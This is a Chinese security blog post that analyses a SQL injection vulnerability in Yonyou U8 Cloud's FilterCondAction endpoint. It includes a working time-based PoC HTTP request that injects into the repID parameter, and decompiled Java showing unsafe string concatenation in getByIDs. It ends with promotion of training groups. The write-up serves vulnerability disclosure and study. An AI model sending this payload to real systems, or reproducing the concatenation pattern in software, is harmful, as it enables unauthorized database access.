> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkzMzE5OTQzMA==&mid=2247487737&idx=1&sn=cbb6a1cb0b5f83638f71454a5ffba8d4

#  用友OA系统U8Cloud FilterCondAction SQL注入漏洞分析  
原创 chobits02  C4安全   2025-07-18 13:19  
  
前言  
  
又来到了久违的漏洞分析环节，平时习惯性先把文章投稿到奇安信社区平台，然后再在这上面搬一下自己的文章，师傅们要是蹲第一手分析的话可以关注一下  
  
这次审计的是用友U8 Cloud系统，其中的
```
FilterCondAction
```

  
方法存在SQL注入漏洞，这是闲着没事干翻了三百多个Action方法审计出来的其中一个漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/EXTCGqBpVJTIChTbJr7t7BRHGLz6M5QarzbJ87BroKyQQ1VUCJOao2BJiaCiahY8Q2rft5rag8yQDiab94W94JEibQ/640?wx_fmt=gif&from=appmsg "")  
  
废话不多说，漏洞利用的POC如下  

```
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.bi.report.rep.FilterCondAction&method=execute&repID=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```

  
其中的
```
repID
```

  
参数存在注入，使用延时注入验证下，成功延时5秒  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTIChTbJr7t7BRHGLz6M5QaT5iclaXx9LSarnPjGXnYRTTicEIXgEcJ5LRzic0kpaGA1YMAtTMy4AQdQ/640?wx_fmt=png&from=appmsg "")  
  
首先看漏洞位于
```
FilterCondAction
```

  
接口处，方法的完整路径为
```
nc.ui.bi.report.rep.FilterCondAction
```

  
  
  
这里只关注下面的execute方法，完整代码如下  

```
public ActionForward execute(ActionForm actionForm) {  
    FilterCondForm form = (FilterCondForm)actionForm;  
    String repID = getRequestParameter(&#34;repID&#34;);  
    AdhocModel adhocModel = (AdhocModel)BIWebRepUtil.getRepModel((IUFOAction)this, repID);  
    if (adhocModel == null)  
      return (ActionForward)new ErrorForward(StringResource.getStringResource(&#34;mbirep0007&#34;));   
    form.setRepID(repID);  
    FilterValueDescriptor fvd = null;  
    IAdhocAnalyzer[] anas = adhocModel.getDataCenter().getAnalyzerModel().getAnalyzerByType(0);  
    if (anas != null && anas.length > 0) {  
      FilterValueAnalyzer fva = (FilterValueAnalyzer)anas[0];  
      if (fva.getFilterValueDescriptor() != null)  
        try {  
          fvd = (FilterValueDescriptor)fva.getFilterValueDescriptor().clone();  
        } catch (CloneNotSupportedException e) {  
          AppDebug.debug(e);  
        }    
    }   
    if (fvd == null)  
      fvd = new FilterValueDescriptor();   
    IColumnData[] refFields = getRefFields(repID);  
    if (refFields == null || refFields.length == 0)  
      return (ActionForward)new ErrorForward(StringResource.getStringResource(&#34;mbirep0008&#34;));   
    FilterCondTableModel model = new FilterCondTableModel(fvd, refFields);  
    form.setFilterCondTableModel(model);  
    addSessionObject(getClass().getName(), fvd);  
    ActionForward actionForward = new ActionForward(FilterCondDlg.class.getName());  
    return actionForward;  
}
```

  
首先是方法接收传参
```
repID
```

  
，然后直接调用
```
repID
```

  
的有两个方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTIChTbJr7t7BRHGLz6M5QaRcmJ5coG4YEicXNSFAZ86uIpWXKcTEJ4508DLZQg9MbHH1yNJ6L2d1w/640?wx_fmt=png&from=appmsg "")  
  
先来看第一个，追踪进入
```
getRepModel
```

  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTIChTbJr7t7BRHGLz6M5QauNkibUCeqYp57U47ZWicnwYPznASNZNa30PWFGphvMq7ZLT4icvsITtxg/640?wx_fmt=png&from=appmsg "")  
  
  
可以看到
```
repID
```

  
又进入了下面的
```
loadRepModelFromDB
```

  
方法当中，追踪方法来到其中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTIChTbJr7t7BRHGLz6M5QaibEt3ON09w9lnQQJaS8RAWJMynglFCfYoLIk749cXWDM6ciaEPqrU43g/640?wx_fmt=png&from=appmsg "")  
  
  
最后
```
repID
```

  
是进了getByIDs方法当中，最终来到漏洞点  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTIChTbJr7t7BRHGLz6M5QaRvWRG3ggFRxX599yBwJ4NELxwhsEHK3icbv5CqbkywDLbGl7aGicr6vg/640?wx_fmt=png&from=appmsg "")  
  
  
代码如下  

```
public ValueObject[] getByIDs(String[] strIDs) throws ReportMngException {  
    int iLen = (strIDs == null) ? 0 : strIDs.length;  
    String sWhere = null;  
    if (iLen != 0) {  
      StringBuffer sbWhere = new StringBuffer();  
      sbWhere.append(&#34;pk_reportmodel in (&#34;);  
      for (int i = 0; i < iLen; i++) {  
        sbWhere.append(&#34;'&#34;).append(strIDs[i]).append(&#34;' &#34;);  
        if (i < iLen - 1) {  
          sbWhere.append(&#34;,&#34;);  
        } else {  
          sbWhere.append(&#34;)&#34;);  
        }   
      }   
      sWhere = sbWhere.toString();  
    }   
    ReportVO[] vos = null;  
    try {  
      vos = (ReportVO[])ReportBO_Client.query(sWhere, DimRescource.UFBI_DATASOURCE);  
    } catch (Exception e) {  
      handleException(e);  
    }   
    return (ValueObject[])vos;  
}
```

  
分析下，这个漏洞其实和我之前分析的华天动力OA的SQL注入一样，都是append方法拼接SQL语句，恶意语句可以闭和最后的
```
)
```

  
号导致的  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTIChTbJr7t7BRHGLz6M5Qayk98IlLoJzesypoLhTqkJicwaTzpPE5LXz1fGTRJG463iaMjgNHA68VQ/640?wx_fmt=png&from=appmsg "")  
  
  
方法中使用
```
pk_reportmodel in ('+repID+')
```

  
这样拼接SQL，就造成了SQL注入漏洞  
  
就这样简单的结束了(*╹▽╹*)  
  
结语  
  
感兴趣的可以公众号私聊我  
进团队交流群，  
咨询问题，hvv简历投递，nisp和cisp考证都可以联系我  
  
**内部src培训视频，内部知识圈，可私聊领取优惠券，加入链接：https://wiki.freebuf.com/societyDetail?society_id=184**  
  
**加入团队、加入公开群等都可联系微信：yukikhq，搜索添加即可。**  
  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/EXTCGqBpVJQSCTuiawtOw7G9JFaBeBc06sHdBhSTMMClOr5wLWmLYIl6Yry9n3ZIL97tylQib5YLOuJFxndeFMEg/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
END  
  
  
  
